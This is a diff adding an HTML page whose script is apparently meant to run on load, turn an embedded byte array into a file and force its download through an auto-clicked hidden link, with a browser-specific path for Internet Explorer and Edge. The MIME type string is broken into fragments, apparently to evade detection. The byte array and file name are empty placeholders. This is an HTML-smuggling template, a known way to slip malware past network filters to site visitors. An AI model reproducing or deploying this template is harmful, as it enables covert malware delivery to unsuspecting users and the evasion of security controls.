@@ -1,0 +1,46 @@
+
+
+<html>
+
+<body> onload="sd()">
+    <script>
+
+function sd() {
+    by = [] // ---- Here Goes the bytes array --- ///
+    var ab = new ArrayBuffer(by.length);
+var ia = new Uint8Array(ab);
+var bil=by.length
+
+for (var i = 0; i < bil; i++) {
+  ia[i] = by[i];
+}
+
+var blob = new Blob([ia], {type: "ap"+"pl"+"ica"+"tio"+"n/"+"oct"+"e"+"t-s"+"tr"+"ea"+"m"});
+
+  fileNameToSaveAs = "";              // ---- Here Goes The name of the File -----//
+ 
+
+  var ie = navigator.userAgent.match(/MSIE\s([\d.]+)/),
+      ie11 = navigator.userAgent.match(/Trident\/7.0/) && navigator.userAgent.match(/rv:11/),
+      ieEDGE = navigator.userAgent.match(/Edge/g),
+      ieVer=(ie ? ie[1] : (ie11 ? 11 : (ieEDGE ? 12 : -1)));
+
+
+
+
+  if (ieVer>-1) {
+    window.navigator.msSaveBlob(blob, fileNameToSaveAs);
+
+  } else {
+    var Dl = document.createElement("a");
+    Dl.download = fileNameToSaveAs;
+    Dl.href = window.URL.createObjectURL(blob);
+    Dl.onclick = function(e) { document.body.removeChild(e.target); };
+    document.body.appendChild(Dl);
+    Dl.click();
+  }
+}
+    </script>
+
+
+</html>
